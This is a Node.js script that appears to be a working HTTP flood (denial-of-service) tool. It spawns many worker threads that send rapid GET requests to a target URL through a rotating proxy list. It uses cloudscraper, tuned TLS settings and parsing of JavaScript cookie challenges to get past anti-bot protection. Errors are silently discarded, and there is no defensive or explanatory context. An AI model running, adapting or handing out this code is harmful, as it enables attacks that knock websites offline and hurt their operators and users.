process.setMaxListeners(0);
const {
  Worker, isMainThread, parentPort, workerData
} = require('worker_threads');

if (isMainThread) {
        for (pas = 0; pas < parseInt(process.argv[4]); pas++) {
        var shit = new Worker(__filename, {
        workerData: process.argv
        });
        }
setTimeout(() => {
    process.exit(1);
}, process.argv[3] * 1000);


        } else {


var request = require('request');
const cloudscraper = require('cloudscraper');
const fs = require('fs');
const {
    constants
} = require('crypto');
var p = workerData[2].replace(/%RAND%/gi, Math.random());

process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});

var theproxy = 0;

var cookies = {};

var target = p.replace('https', 'http');

    var proxies = fs.readFileSync(workerData[5], 'utf-8').replace(/\r/g, '').split('\n');
    console.log("An instance have been created");
    setInterval(function() {
        theproxy = theproxy + 1;
        if (theproxy == proxies.length - 1) {
            theproxy = 0;
        }
        var ourproxy = proxies[theproxy];
        cloudscraper.get({
            agentOptions: {

                secureOptions: constants.SSL_OP_NO_TLSv1 | constants.SSL_OP_NO_TLSv1_1,

                ciphers: constants.defaultCipherList + ':!ECDHE+SHA:!AES128-SHA'
            },
            url: target,
            headers: {
                cookie: cookies[ourproxy] || ''
            },
            proxy: 'http://' + ourproxy
        }, function(error, response, body) {
            if (body) {
                if (body.indexOf('document.cookie="') !== -1) {
                    var asd = body.split('"');
                    cookies[ourproxy] = response.request.headers['cookie'] + '; ' + asd[1] + ';';

                    cloudscraper.get({
                        agentOptions: {

                            secureOptions: constants.SSL_OP_NO_TLSv1 | constants.SSL_OP_NO_TLSv1_1,

                            ciphers: constants.defaultCipherList + ':!ECDHE+SHA:!AES128-SHA'
                        },
                        uri: asd[3],
                        headers: {
                            cookie: cookies[ourproxy]
                        },
                        proxy: 'http://' + ourproxy
                    }, function(error, response, body) {
                    });
                }
            }
        });
    });
}
